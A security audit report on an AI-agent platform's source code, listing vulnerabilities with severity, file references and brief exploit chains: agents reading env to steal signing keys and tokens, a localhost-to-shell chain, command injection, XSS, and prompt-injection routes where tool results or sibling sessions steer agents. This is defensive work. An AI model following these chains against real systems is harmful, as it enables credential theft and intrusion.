# Security Audit — Source-Level Findings

Date: 2026-09-19. Scope: repository source code only (dependency advisories tracked separately).

**Remediation status (same-day):** P-1/P-2/H-1 fixed — `harnessSpawnEnv` now denies `CLAXEDO_*`/`WORKSPACE_RUNTIME_*` by default with an allowlist + secret-suffix backstop, and Pi is routed through it (`agent-sdk-runtime/src/harnesses/shared/spawn-env.ts`, `pi/driver.ts`). P-62 fixed — `runGit` now runs under `buildSafeEnv` (`workspace-runtime/src/git.ts`). P-58 fixed — `discover`/`save-discovered`/`sync-local` require loopback. P-65 fixed — PUT meta/network-policy authorize the stored workspace + separately authorize rebinding. P-66 fixed — signed-mode bootstrap requires token or loopback. P-63 fixed — unscoped PTY connect requires loopback. P-57 substantially mitigated — `shellWorkspaceGate` now requires a resolved workspace + `openWorkspace` + admin for writes on all workspace-scoped shell paths in signed mode. Repo-scanning test added: `spawn-env.secrets.test.ts`.

## Hosted / sensitive surfaces (deep dive)

Covers: AI-provider credential storage → sandbox-VM materialization, workspace relay, MCP auth.

| ID | Severity | Surface | Finding | Evidence | Confidence |
|----|----------|---------|---------|----------|------------|
| H-1 | **HIGH** | Sandbox env / runtime auth | `WORKSPACE_RUNTIME_TRUSTED_DIRECT_TOKEN` is a static full-access bearer injected into every hosted sandbox's env and inherited by agent harness children. On the runtime it bypasses relay-host auth on **every** route (sets `relayHostDirectAuth`), including PTY spawn / file write / process control. The spawn-env deny-list strips `WORKSPACE_RUNTIME_CONFIG_TOKEN` and `CLAXEDO_WR_TRUSTED_DIRECT_TOKEN` but **not** this name. Token is also readable via `/proc/<runtime-pid>/environ` by same-uid processes, and the runtime API sits on the sandbox's publicly reachable URL (Box public route, Daytona/Modal published URLs) — no `x-forwarded-by` needed for direct auth. If `WORKSPACE_RUNTIME_CONFIG_TOKEN` is set at the control plane, `externalConfigToken()` makes **one token valid on every workspace**. Exploit: agent-run command or repo postinstall reads `env` → exfiltrate → remote full runtime access until restart. `/api/wr/config` itself still requires the management JWT. | `claxedo-server-core/src/hosts/workspace-runtime/env.ts:45-50`; `workspace-runtime/src/workspace-host-service-auth.ts:241`; `agent-sdk-runtime/src/harnesses/shared/spawn-env.ts:3-13`; `claxedo-server/src/workspace/supervisor/control-token.ts:6-18`; `agent-sdk-runtime/src/harnesses/claude/driver.ts:362` | HIGH on each link |
| H-2 | LOW-MED | Credential verify | `workerBase()` accepts `http:` URLs — a `cloudflare` sandbox-driver credential stored with an `http://` worker URL gets `Authorization: Bearer <api_token>` sent cleartext by the verify probe. | `claxedo-server-core/src/credentials/operations/sandbox-verify.ts` (`workerBase` protocol check) | HIGH |
| H-3 | LOW | Credential lifecycle | No secret retraction: a revoked credential stays live inside a running sandbox until the next config push or VM restart. Expected for env materialization; needs a documented statement. | `claxedo-server/src/workspace/supervisor/config-sync.ts:21-44` (push-only model) | HIGH |
| H-4 | LOW | Credential resolution | `resolveSecretsForScope` swallows backend errors (`catch {}`) — a degraded backend silently produces a snapshot missing creds; the VM boots under-authenticated. Availability, not security. | `claxedo-server-core/src/credentials/registry.ts:629` | HIGH |
| R-1 | MED | Relay → host | `x-forwarded-by: workspace-relay` is an unauthenticated marker — a leaked RHT replayed directly at the sandbox's public URL can forge it. Bounded by 60s RHT TTL + runtime-side role re-check (`denyWorkspaceViewers`) + `parent_jti` checks at lease renewal. The comment claims a provenance property the header can't provide; enforcement needs network-level reachability, not a header. | `workspace-runtime/src/workspace-host-service-auth.ts:311-324`; `workspace-relay/src/server.ts:540` | HIGH |
| R-2 | LOW | Relay | Verify-cache staleness: verified RAT claims cached ≤10s, minted RHTs ≤30s — revoked member keeps access for up to ~10s on HTTP path (open sockets re-check every 30s + hard `exp` timer). Bounded; make deliberate. | `workspace-relay/src/server.ts:317,623`; `workspace-relay/src/bun.ts:1115-1160` | HIGH |
| R-3 | LOW | Relay | `authorizeHostTunnel` accepts an `authorizeHostTunnel` override — a composition passing a permissive one bypasses host/workspace claim binding. Current wiring is fine; foot-gun note. | `workspace-relay/src/bun.ts:1094-1113` | MED |
| M-1 | MED | MCP auth | Anonymous full-scope credential on auth-disabled self-hosted nodes: `!auth.enabled && isLoopbackLocalRequest && !bearer` → `fullUserCredential` (all scopes incl. admin), and `local` lets a user credential name any workspace per call. "Loopback" includes SSH port-forwards and proxies that don't set `x-forwarded-for`; any same-box process holds every workspace's keys. | `claxedo-server/src/deployments/self-hosted-node/app.ts:1253-1276` | HIGH |
| M-2 | LOW | MCP sessions | `credentialKey` includes sorted scopes — an OAuth token refresh that gains a scope silently invalidates in-flight sessions. Correct but surprising. | `claxedo-mcp/src/server.ts:142-147` | HIGH |

## Earlier source-level pass (non-hosted)

| ID | Severity | Surface | Finding | Evidence |
|----|----------|---------|---------|----------|
| S-1 | HIGH | Local server | Any `localhost` web page gets full control of the unsigned local server: CORS reflects any `http://localhost:*`/`127.0.0.1:*` origin → readable+writable. Chain: `GET /file/content?directory=/&path=<abs>` arbitrary file read → `GET /agent?directory=` workspace create (state-changing GET) → `POST /api/wr/pty` + WS connect → interactive shell. Deterministic port 2593 (+64 scan). | `claxedo-local-server/src/local-app.ts:83-87`; `platform/auth/peer-address.ts:139-143`; `file-browser.ts:59-85`; `server-port.ts:27` |
| S-2 | HIGH | Documents editor | Unsanitized `mermaid.render()` SVG → `innerHTML` (`securityLevel:"strict"` only — the exact control the mermaid advisories bypass). Session path correctly pipes through `sanitizeSvg` + `htmlLabels:false`. Stored XSS in the Electron renderer that holds the IPC bridge. | `claxedo-app/src/features/documents/editor/mermaid-block.ts:351,446`; contrast `mermaid-timeline.ts:82` |
| S-3 | MED | Renderer | No CSP on the renderer document; packaged `loadFile` means the server-side `API_CONTENT_SECURITY_POLICY` never applies. Absent second layer behind S-2. | `index.local.html`; `desktop/src/main/windows.ts:219` |
| S-4 | MED (verify) | Webhooks | `verifyGitHubWebhookSignature` is correct but has no production caller; channel verification is delegated to Chat SDK `bot.webhooks` handlers — confirm they verify. | `claxedo-server/src/channels/github.ts:97` |
| S-5 | MED | Windows spawn | `shell: true` codex app-server spawn joins args into a `cmd.exe` line; args are fixed today — injection if any arg becomes user/config-influenced. | `agent-sdk-runtime/.../app-server-process.ts:119-126` |
| S-6 | LOW | Local server | `new RegExp(pattern)` on request input — catastrophic backtracking hangs the daemon (loopback-scoped self-DoS). | `claxedo-local-server/src/shell/files.ts:79` |
| S-7 | LOW | Local server | `fileSearchCache` grows unbounded by unique `?directory=` key; expiry only on re-access. | `claxedo-local-server/src/shell/files.ts:26` |
| S-8 | LOW | Local server | `POST /api/claxedo/track` accepts arbitrary `distinctId`/`event`/`properties` — unauthenticated analytics poisoning. | `claxedo-local-server/src/local-app.ts:195-204` |
| S-9 | LOW | Electron IPC | `open-path` allows `shell.openPath` on any absolute path after shape checks — blast-radius item behind S-2. | `desktop/src/main/ipc.ts:177-178` |
| S-10 | LOW | SSE | `?lastEventId=` flows into `writeSSE({id})`; decoded `%0A` → newline injection into own stream (hono GHSA-p6xx). Self-scoped. | `workspace-runtime/src/routes/events.ts:404-423` |
| S-11 | LOW | Token compare | `agentHookAccess` token compared with `!==` — timing nit; token is `crypto.randomUUID()` so theoretical. | `workspace-runtime/src/pty/index.ts:564,572` |
| S-12 | LOW-MED | Project routes | `POST /project` accepts `http:`/`ssh:` clone URLs — git-protocol SSRF probe on signed self-hosts; `file://` rejected, `--` prevents arg injection. | `claxedo-local-server/src/projects-route.ts:67-74` |

## Verified non-findings

| Area | Verified defense |
|------|------------------|
| Credential envelope | AES-256-GCM + HKDF-SHA-256 per-org keys + AAD bound to key-id and credential-id; rotation via `KEK_NEXT` drain-on-read; fail-closed on unknown kid/tag |
| Consent gate | `scope:"shared"` fan-out requires the stored `consent` flag (`registry.ts:646`); caller-settable scope is the consent |
| Vercel driver | Brokered secrets splice egress header transforms per allowed host; raw values never enter VM env (`vercel.ts:174`) |
| Config push | `/api/wr/config` requires management JWT (iss `claxedo-control-plane`, aud `supervisor-backplane`, JWKS-verified); unknown-field-rejecting schema |
| Relay JWTs | Alg allowlist (EdDSA/ES256/RS256); per-class iss/aud — no cross-class confusion; workspace_id + host_id bound to request |
| Relay revocation | `isRuntimeAccessTokenActive` wired in Bun + worker entrypoints; open-socket re-checks + exp close timer; `parent_jti` re-checked per lease renewal |
| Relay headers | Inbound strips `x-forwarded-*`/`x-real-ip`/hop-by-hop/`x-claxedo-internal-*`/`x-supervisor-*`; Cookie stripped for user-hosted; CORS re-stamped on responses |
| Relay roles | `viewer` = GET/HEAD/OPTIONS only, denied `/api/wr/pty*`; authorized path is the same decoded path that is forwarded (no `%3F` smuggle) |
| Host tunnel | HTT binds `host_id` + `workspace_ids`; one tunnel per host; WS token via `sec-websocket-protocol` (no URL tokens) |
| MCP runtime credential | HMAC-SHA-256, 32B random secret, fixed header literal (no alg substitution), timing-safe compare, workspace+runtime+session bound, `rotate()` kills all prior |
| MCP sessions | Session store keyed on full credentialKey + bearer digest; `?session=` must match claims; per-session `McpServer`+transport (SDK cross-client advisory N/A); in-flight + session caps |
| MCP tool authz | `assertToolAccess` enforces audience + readOnly + scope + cross-machine per call; destructive tools are human-only + elicitation-confirmed |
| MCP OAuth | RFC 7662 introspection; audience-bound to the MCP resource; `claxedo:admin` restricted to deployment-registered client ids |
| Electron | Navigation can't leave app doc; `window.open` denied; scheme-allowlisted `openExternal`; webview attach pins sandbox/contextIsolation; IPC caller-guarded |
| Local loopback gate | Socket-peer + Host + Origin loopback checks; forwarded-header presence fails closed; remote origins rejected outright |
| Secrets hygiene | No committed secrets; sensitive files `0o600`/`0o700`; git creds via env config never argv; logs reference ids not values |

## Per-package deep audit (35 agents, one per package)

Each package was audited by a dedicated read-only agent tracing entrypoints to sinks. All 35 returned (9 required a second pass after a rate-limit interruption — results merged below). Findings are new — earlier IDs (H/R/M/S) are not repeated.

### New findings — HIGH / HIGH-potential

| ID | Severity | Package | Finding | Evidence | Confidence |
|----|----------|---------|---------|----------|------------|
| P-1 | **HIGH** | agent-sdk-runtime | **Pi harness spawns every agent child with the full control-plane env, unfiltered.** `piSpawnEnv` withholds only provider credential names (`ANTHROPIC_API_KEY`, …) and never calls `harnessSpawnEnv`. Every `CLAXEDO_*` secret reaches Pi session/RPC/goal-evaluator children: `CLAXEDO_RUNTIME_ACCESS_TOKEN_PRIVATE_KEY_PEM`, `CLAXEDO_CLI_TOKEN_PRIVATE_KEY_PEM`, `CLAXEDO_RELAY_HOST_SIGNING_KEY_PEM`, `CLAXEDO_CONTROL_PLANE_SERVICE_TOKEN`, `CLAXEDO_CREDENTIALS_TOKEN`, `CLAXEDO_RELAY_RESOLVER_TOKEN`, `CLAXEDO_EMBEDDED_AUTH_SECRET`, `CLAXEDO_POLAR_WEBHOOK_SECRET`, `CLAXEDO_ACCESS_TOKEN`, `CLAXEDO_DEV_TOKEN`. An agent reading `env` recovers JWT-signing PEMs and service tokens — worse than H-1's single token. | `agent-sdk-runtime/src/harnesses/pi/driver.ts:232-238`; `pi/auth.ts:87-93`; `shared/spawn-env.ts:3-19`; `workspace-runtime/src/pty/env.ts:105-129` | HIGH |
| P-2 | **HIGH** | agent-sdk-runtime | **`INTERNAL_SECRET_ENV` under-covers every filtered harness.** The 8-name denylist omits `WORKSPACE_RUNTIME_TRUSTED_DIRECT_TOKEN` (H-1) *and* all `CLAXEDO_*` signing PEMs/service tokens — so Claude, Codex, and ACP children also inherit them. Denylist can't see future secret-shaped vars; `pty/env.ts`'s allowlist + `CLAXEDO_` deny-by-default + `_(TOKEN\|SECRET\|KEY\|PASSWORD\|PEM)$` suffix backstop is the correct model. `WORKSPACE_RUNTIME_OWNER_GRANT`/`_TASKS_CAPABILITY` passthrough is undocumented either way. | `shared/spawn-env.ts:3-13`; `claude/driver.ts:298,798`; `codex/protocol.ts:190-192`; `acp/transport.ts:132` | HIGH |
| P-3 | **HIGH (conditional)** | claxedo-host-connector | **No TLS enforcement on `control_plane_url`.** Set `http://` and an on-path attacker can: (a) steal the cleartext invitation `secret` in the redeem body — and occupy `(owner, host_id)` **permanently** server-side; (b) forge heartbeat responses (unsigned beyond the channel) carrying arbitrary `allowed_roots`/`assignments`/relay endpoints → host prepares runtimes on attacker dirs and dials a tunnel to the attacker's relay; (c) replay captured signed requests inside the 60s skew. Default `https://app.claxedo.com` is the only protection. | `machine-transport.ts:74-76`; `bootstrap.ts:104-114`; `host-state.ts:178,409-429`; `workspace-authority.ts:2324-2336` | HIGH |
| P-4 | **MED-HIGH** | claxedo-channels | **Telegram webhook secret env-name gap → unverified webhooks.** Registry enables Telegram if `CLAXEDO_CHANNEL_TELEGRAM_WEBHOOK_SECRET_TOKEN` is set, but `createTelegramAdapter()` reads only unprefixed `TELEGRAM_WEBHOOK_SECRET_TOKEN` — the prefixed var is never mapped. Adapter treats the secret as optional → `POST /api/channels/telegram` accepts forged updates with attacker-chosen `from.id` → impersonate allowlisted/pairing-admin senders → drive agent sessions. Boot warning only fires on `0.0.0.0` binds (reverse-proxy setups never warn). | `channels/src/registry.ts:44-54`; `chat-sdk-adapters.ts:86-87`; `control-plane.ts:152-155,174-182` | HIGH mech / MED adapter-behavior |
| P-5 | **MED→HIGH** | agent-event-runtime | **Forged subagent bindings via prompt injection → cross-session attach.** `hostSubagentBinding` treats any tool-result text containing `{"kind":"claxedo.subagent","sessionId":"…"}` as a legit binding; the Claude adapter scans **every** `tool_result` block (not just `create_subagent` results). A hostile file-read/web-fetch mints a `spawn` observation naming an arbitrary foreign `sessionId` with `transcript:{kind:"live"}`. Severity hinges on whether `observeSubagent` verifies parent↔child ownership — flagged for the agent-sdk-runtime follow-up. | `host-subagent.ts:35-76`; `claude/adapter.ts:373-382,446-449`; `agent-sdk-runtime/.../driver.ts:763` | HIGH code path / MED impact |

### New findings — MEDIUM

| ID | Severity | Package | Finding | Evidence | Confidence |
|----|----------|---------|---------|----------|------------|
| P-6 | MED | claxedo-desktop | **`wsl-path` IPC interpolates renderer input into `sh -lc` — command injection inside WSL.** Only `"` escaped; `$(…)`, backticks live. Runs *during* path conversion, before `openInPathVerdict` validates. Windows+WSL only. | `desktop/src/main/apps.ts:100-114`; `ipc.ts:220-223` | HIGH mech |
| P-7 | MED | claxedo-desktop | **`store-*` IPC forwards raw store `name` to `electron-store`/`conf` → `<name>.json` resolved under `cwd`; `../` or absolute names escape `userData`** → arbitrary `*.json` read/write/delete as OS user. Verify conf@14 filename derivation on install. | `ipc.ts:238-276` | HIGH / dep-unverified |
| P-8 | MED | claxedo-desktop | **`open-path`/`open-in` allowlist contains interpreters** (`Terminal`, `iTerm`, `powershell`, …) and file type is unchecked — `powershell x.ps1`/`open -a Terminal x.command`/bare `shell.openPath` on `.command`/`.exe` executes. "Open this location" is script execution. | `open-in-apps.ts:16-33`; `open-in-guard.ts:51-72`; `ipc.ts:279-310` | HIGH |
| P-9 | MED | claxedo-desktop | **Beta and prod share one GitHub `latest` channel + `allowDowngrade:true`** — whichever artifact last wrote `latest.yml` updates both variants; stale releases roll back security fixes. | `electron-builder.config.ts:263,273`; `index.ts:552-557`; `finalize-latest-yml.ts:117-127` | HIGH |
| P-10 | MED | claxedo-mcp | **Destructive tools execute unconfirmed when the MCP host lacks elicitation — and still stamp `approved: true` downstream.** The "server-side check" is the flag the MCP server itself stamps → circular. Admin-scoped token + non-interactive host → session_delete / workspace destroy with zero human checkpoint. | `tools/registry.ts:71-78`; `workspaces.ts:84-90,111-114`; `server.ts:256-258` | HIGH |
| P-11 | MED | claxedo-mcp | **Runtime credential can `session_send`/`session_abort` to any session in its workspace.** A prompt-injected `ask`-mode session steers a sibling running `full` permission (the escalation closed for `session_create` survives on send). `own-children-only` check exists but is never applied here. | `tools/sessions.ts:140-170`; `attention.ts:337-343` contrast | HIGH code / MED defect |
| P-12 | MED | claxedo-host-connector | **CP-supplied endpoint URLs trusted verbatim** — `relay.url`, `jwks_url`, `session_authority_url` string-checked only, persisted, drive JWKS verification + tunnel dial. With P-3: attacker JWKS anchors host token verification; `http:` relay → cleartext `ws:` carrying the tunnel token. | `machine-transport.ts:151-162`; `host.ts:163,282-322`; `workspace-relay-host-tunnel.ts:148` | HIGH |
| P-13 | MED | workspace-relay | **CF room performs no `Origin` check on WS upgrades** (Bun enforces `requireAllowedOrigin` deliberately). Cross-site WS reaches authz — bounded because RAT isn't ambient, but asymmetric policy for identical traffic. | `cloudflare.ts:2060-2066`; `bun.ts:1687` contrast | HIGH |
| P-14 | MED | workspace-relay | **Bun direct (cloud) HTTP path buffers request AND response bodies unbounded** — tunnel path caps at 16 MiB, CF streams; only Bun direct buffers `arrayBuffer()` both directions. Authenticated memory-pressure DoS. | `bun.ts:1146,1164`; contrast `bun.ts:1085-1116`, `cloudflare.ts:2282-2287` | HIGH |
| P-15 | MED-LOW | workspace-relay | **Host-controlled `Set-Cookie` passes tunnel response → shared relay origin; cookies later forwarded verbatim to cloud targets.** CF additionally lets upstream `access-control-allow-origin:*` survive (`withCors` never strips) → self-granted cross-origin reads. | `bun.ts:541-547`; `cloudflare.ts:596-600,906-923`; `server.ts:741` | MED |
| P-16 | MED | claxedo-tasks | **Decode-time field-error amplification**: a 12.6 MiB body of `{"plugins":[{},…]}` produces ~8M `InvalidField` objects serialized into the 400 — memory exhaustion on workerd (≈5–40× amplification). | `http/routes.ts:217-220,61-63`; `parse.ts:39-49`; `decode.ts:78-86,115-119` | HIGH |
| P-17 | MED | wakes | **`expiresAt` enforced only by the periodic sweep, never at the fire path.** `resolve`/`deliverEvent` fire expired-but-unswept wakes; lane-scoped `runDue` on hosted never expires rows → up to 15-min post-expiry authorization window. | `wakes.ts:348-361,375`; `sqlite-store.ts:276-279`; `wake-lane.cf.ts:120` | HIGH |
| P-18 | MED (design) | wakes | **`deliverEvent` is an unscoped cross-workspace broadcast** keyed only on `event_key`; payload lands verbatim in agent prompts → prompt-injection primitive the day a webhook ingress is wired. Not wired today. | `wakes.ts:363-370`; `machine-wakes.ts:39-42` | HIGH |
| P-19 | MED | claxedo-telemetry | **No PII/secret scrubbing anywhere; `withSpan` exports raw `error.message` verbatim** to the collector (paths, credential-bearing URLs, upstream bodies). Zero production importers today — lands with the tracing plan. | `tracer.ts:167-173`; `span.ts:85-101`; `exporter.ts:56` | HIGH |
| P-20 | MED | workspace-relay-protocol | **`createHttpTokenVerifier` doesn't require `https:` on the introspection endpoint** — cleartext tokens + a MITM returning arbitrary `{subject,claims}` = full auth bypass, contingent only on scheme. Response shape check accepts any well-formed claims. | `token-verifier.ts:130,136,146-166` | HIGH |
| P-21 | MED | claxedo-channels | **`/new` and `/status` execute before the `authorize` hook** — `/new` resets the thread's session binding unconditionally (`resetSession` side-effect, `abortSession`); an allowlisted-but-unbound member can detach another user's session and learn its id. `/stop` *is* authorized — inconsistent. | `command-emit.ts:222-234,388-407` | HIGH |
| P-22 | MED | cli | **`claxedo login` passes server-controlled `verification_uri_complete` to `cmd /c start` unquoted (Windows) → `&` command injection; `open`/`xdg-open` accept `file://` → local app launch.** A malicious/compromised/plaintext-HTTP control plane executes on the operator's host. | `cli/src/auth/device-code.ts:41,52-58` | HIGH mech |
| P-23 | MED-LOW | claxedo-app | **`platform.openLink` = bare `window.open(url,"_blank")` on web builds** — no scheme check, no `noopener`; `javascript:` in a server-controlled field (OAuth/verification URLs are server-returned) executes in the app document. Desktop is guarded; web isn't. | `app/entry/main.tsx:179-181`; `local.tsx:61-63`; `connect-integration.tsx:38` contrast | HIGH mech |
| P-24 | MED-LOW | claxedo-local-server | **`GET /api/claxedo/bootstrap` serves homedir + project list + provider_auth to unauthenticated requests** (no token → falls to `localBootstrap` with no loopback check). GET-only so cross-origin reads are blocked, but any localhost origin gets free recon feeding S-1's chain. | `shared-routes/bootstrap.ts:178-203` | HIGH (self-verified) |
| P-25 | MED-LOW | claxedo-app | **`claxedo://open-project?directory=` registers arbitrary local dirs as projects with no confirmation**, and `claxedo:` survives the markdown sanitizer as a clickable transcript link → agent output can render a link that registers `~/.ssh` + seeds a prompt. | `route-bridge.tsx:226-246`; `ui/src/context/marked.tsx:477-484`; `navigation-guard.ts:41` | HIGH |
| P-26 | MED-LOW | claxedo-desktop | **`browser:register` accepts any `webContentsId`** — no check that the target is an agent-browser webview → screenshot/CDP/DevTools/`clearStorageData` on the main window's default session. | `ipc.ts:138-142`; `browser/registry.ts:24-26`; `handle.ts:306-484` | HIGH |
| P-27 | MED-LOW | claxedo-channels | **Sender identity keyed on mutable usernames** — GitHub `sender.login` (id available, unused), Telegram `from.username` fallback. Rename + re-register → inherit the old identity's allowlist/bindings/pairing-admin. | `transport/github.ts:48-49`; `telegram.ts:45`; `chat-sdk-bridge.ts:147` | HIGH |
| P-28 | MED-LOW | sandbox-contract | **`secretBrokering` enforcement fails open**: three sites check `=== "none"` → refuse; `undefined`/typo'd values are treated as broker-capable and handed provider secrets — contradicting the documented "fails closed on anything not `native`". Latent until a driver omits the field. | `sandbox-manager/src/index.ts:899`; `server-core/.../native-delivery.ts:192`; `server/.../sandbox-delivery.ts:45` | HIGH |
| P-29 | MED-LOW | claxedo-host-connector | **Scope/consent durability gaps**: `scopeRevision` is in-memory → first beat accepts any revision (older scope re-widens `allowed_roots`); `unack()` deletes only the `acked` entry → withdrawn consent silently re-granted on the next assignment delivery; `postJson` follows redirects → signed request + invitation secret leak cross-origin on 307/308. | `connector.ts:366-369,577-582`; `host.ts:309-342`; `machine-transport.ts:103-111` | HIGH |
| P-30 | MED-LOW | sandbox-contract | **Ambient env credentials act as the configured/auth gate** — `VERCEL_TOKEN`, `VERCEL_TEAM_ID`, `CLOUDFLARE_API_TOKEN` presence alone marks the driver configured and authorizes sandbox provisioning under that account; env-name vocabularies diverge between contract and hosted worker (`CLOUDFLARE_API_TOKEN` vs `CLOUDFLARE_SANDBOX_API_TOKEN`; `DAYTONA_API_KEY` contract-silent). | `sandbox-contract/src/index.ts:99-137`; `routes/index.ts:511,532` | MED |

### New findings — LOW / informational

| ID | Sev | Package | Finding | Evidence |
|----|-----|---------|---------|----------|
| P-31 | LOW | claxedo-app | `<webview>` guest `ipc-message` payloads trusted without inspect-mode/nav-state check (prompt-context injection); webview `src`/`navigate` accept unvalidated scheme strings (`javascript:`/`file:`); runtime-supplied hrefs rendered unfiltered (mitigated by noopener+target=_blank). | `browser-pane.tsx:759-837,665,455-457`; `browser-url.ts:14` |
| P-32 | LOW | agent-sdk-runtime | `writeCodexAuthFile` non-atomic + symlink-following + mode-only-on-create (pre-existing 0644 `auth.json` stays world-readable); prompt attachments: lexical-only confinement (symlinked `.claxedo` escapes) + no size cap; Pi argv exposes prompt/objective text via `ps`. | `codex/auth-file.ts:55-56`; `prompt-attachments.ts`; `pi/driver.ts:136-139` |
| P-33 | LOW | agent-sdk-runtime | Windows `shell:true` spawns with quote-wrapped command + unescaped args — ACP (config-driven command/args, exposed today) and codex app-server (fixed args, latent). | `acp/transport.ts:128-131`; `codex/app-server-process.ts:119-126` |
| P-34 | LOW | workspace-relay | Pre-open WS queue closes only when BOTH bounds exceeded → frame count effectively unbounded; no send-buffer guard on Bun upstream→client; CF tunnel responses lack cumulative cap; stale-socket frames act on current tunnel; unauthenticated DO creation + permanent region pinning; `setTimeout` overflow on far-future `exp` (fail-closed but wrong); cached rejected `loadRoom` bricks a DO. | `bun.ts:1906-1914,2013-2016,1293-1297`; `cloudflare.ts:1878,2439,183-188,1014-1022`; `worker.ts:289-296` |
| P-35 | LOW | egress-broker | No timeouts/concurrency/size limits on upstream fetch or authority calls (each `resolve` = registry read + decrypt → unbounded concurrent decrypt work). Non-Bearer `Authorization` slips the dual-identity check (foreign value never compared, but never forwarded either). | `broker.ts:36-42,89-96` |
| P-36 | LOW | claxedo-mcp | Node-mount `resolveWorkspace` falls back to caller-chosen `?directory=` when the stamped workspace id is unknown → cross-workspace access on auth-disabled nodes (narrow); `session_create` forwards `repoUrl` unvalidated (control-plane check needed); `session_create` audit lacks created id. | `internals.ts:66,448`; `store/index.ts:691-704`; `sessions.ts:329-333` |
| P-37 | LOW | claxedo-telemetry | Remote `traceparent` sampled flag forces recording — `sampleRoot` is not a consent gate; unvalidated `tracestate` reflected verbatim into outbound headers; `service.*` overridable via resource.attributes; OTLP headers env parsing gaps; unbounded attrs/events; dev collector body DoS. | `tracer.ts:99`; `trace-context.ts:101,124`; `span.ts:109-113`; `exporter.ts:94-103` |
| P-38 | LOW | workspace-relay-protocol | Introspection response `exp` never checked vs wall-clock; redirect-follow re-sends token in POST body; `__proto__` header keys pass the frame validator (latent for consumers that merge); frame validator has no size limits; `ws.close` code range broader than spec. | `token-verifier.ts:278-300,130-138`; `index.ts:254-264` |
| P-39 | LOW | agent-event-runtime | Unbounded state growth + O(state)-deep-clone per ingest (quadratic via payload-controlled `toolCallId`s); `__proto__` direct-assignment prototype swap in ACP/projection maps; raw payloads (incl. secrets) propagated unredacted into every event + diagnostics. | `projection.ts:1672,1174`; `acp/state.ts:497-537`; `runtime.ts:52,63` |
| P-40 | LOW | agent-runtime-contract | Prototype-key lookups on plain-object tables: `canonicalToolName("constructor")` returns `Object` (type lie → renderer crash/mislabel); same in `USAGE_WINDOW_NAMES[harness]`. `assertAgentExecutionBinding` self-referential default disables all comparisons; `workspaceId`/`upstreamSessionId` only shape-checked at real callers. `isAgentContentPart` validates only discriminant fields (`file.url` accepts `javascript:`; `attachments:[{}]` → render TypeError). | `tool-names.ts:31-34`; `usage-windows.ts:18`; `errors.ts:35-37`; `content.ts:395-491` |
| P-41 | LOW | claxedo-connections | Orphaned credential write when `upsert` fails after `credentials.put` (durable secret residue, no reclamation); all route gates default allow-all; `auth-failure` endpoint degrades a connection without provider corroboration (auth'd caller DoS); credential fetches rely on runtime cross-origin `Authorization` stripping; device-flow `peek` ignores `completing`. | `service.ts:136-164`; `routes.ts:69-71,244-252`; `fetch-timeout.ts:48-56`; `attempts.ts:172-191` |
| P-42 | LOW | opencode-server-adapter | Dot-segment traversal via `upstreamSessionId` (`..` survives `encodeURIComponent`; same-origin credentialed retarget only); redaction applied to `error` events but not `tool-error`/`tool-output`; header values not CR/LF-validated at parse (Headers fails closed anyway); reserved-header list misses `accept`/`content-type`/hop-by-hop; `http://` baseUrl allowed. | `adapter.ts:67-111,438,469-473`; `config.ts:58,141,160-169` |
| P-43 | LOW | cli | `deploy --app` path traversal (`../../x` → writes `<path>.fly.toml` outside root) + TOML injection in generated config; systemd unit quoting misses `%`-specifier/`$` escaping; no `https:` enforcement on `CLAXEDO_CONTROL_PLANE_URL`/issuer (cleartext tokens). | `deploy.ts:146-147,212-214`; `service.ts:81-83`; `config.ts:16-18`; `auth-descriptor.ts:42-66` |
| P-44 | LOW | claxedo-tasks | Id strings unbounded (12MB `clientRequestId` → adapter/index limits); attachments served `inline` w/o `nosniff`, bytes never verified vs declared mime; `createdFrom`/`startedFrom` provenance accepted unverified from signed callers; deleted-session links disclose preset names. | `parse.ts:130`; `routes.ts:206-211`; `service.ts:165-174,344` |
| P-45 | LOW | wakes | `authorize` defaults to allow-all (token possession = resolution if host forgets); `listForSession` returns approval bearer tokens in full rows; `once()` receipts are check-then-act (not race-safe); `depth` is trusted caller input; `schedule({at:NaN})` → dead row counting against live cap. | `wakes.ts:146,343-346,421-432`; `tools.ts:115` |
| P-46 | LOW | claxedo-helpers | `claxedoDocumentReferenceId` uncaught `URIError` on malformed `%` escapes → crashes MCP tool/CLI; `joinUrl` lets absolute-URL `pathname` escape base (no callers); `inside("/","/etc")` misclassifies (fails closed); `cliFlagValue` consumes next `--flag` as value; `waitForHealth` no per-attempt timeout; `stopChild` pid-reuse window on group kill; credentials write follows symlink. | `claxedo-document.ts:11-12`; `url.ts:55-57`; `path.ts:13-15`; `cli.ts:21`; `async.ts:66-74`; `process.ts:80-89`; `claxedo-credentials.ts:79` |
| P-47 | LOW | claxedo-web | `almostnode/server.js` dev proxy forwards all headers incl. cookies/auth to `app.opencode.ai` and strips CSP (keep out of deploys, bind 127.0.0.1); `public/_headers` lacks CSP/`nosniff`/`frame-ancestors` (free win on Pages). | `almostnode/server.js:4-35`; `public/_headers:1-16` |
| P-48 | LOW | storybook | Dev endpoint `POST /__playground/apply-css` writes source files — no auth/origin check, prefix-only containment (missing `path.sep` boundary); `server.fs.allow` = whole repo root; 4MB real-transcript fixture (no creds found). | `.storybook/playground-css-plugin.ts:61-135`; `main.ts:46-49` |
| P-49 | LOW | script/ (dev-CI) | Unverified downloads + pipe-to-shell in `cbx-rebake` — output baked into the persistent CI base image (worst); `cbx-ci-remote.sh`/`cbx-prepare-windows.ps1` fetch bun/rustup/node unverified or `@latest`-unpinned while the crabbox binary is sha256-verified; `.env` sourced as shell code in `cbx`; unquoted `E2E_ARGS` into remote `bash -c`. | `cbx-rebake:69-74`; `cbx-ci-remote.sh:72-77,113-116,163-165`; `cbx:92-95`; `cbx-e2e-shard.sh:33-38` |
| P-50 | INFO | claxedo-documents-service | `enqueue` lacks shape validation + grant verification at the RPC seam where the future runtime plugs in (fails closed today — no runtime wired); authZ is binding-possession + non-secret provenance equality (binding = capability — document it). | `service.ts:184-190`; `worker.cf.ts:16-34`; `service.ts:140-162` |
| P-51 | INFO | claxedo-desktop | `set-default-server-url` persists unvalidated URL (renderer can permanently repoint the app at a hostile daemon); no CSP meta on app docs + no permission handler on default session (extends S-3); `checkAppExists`/`resolveAppPath` existence oracle; `set-zoom-factor` unclamped at IPC. | `ipc.ts:176-187,335-341`; `apps.ts:50-98` |
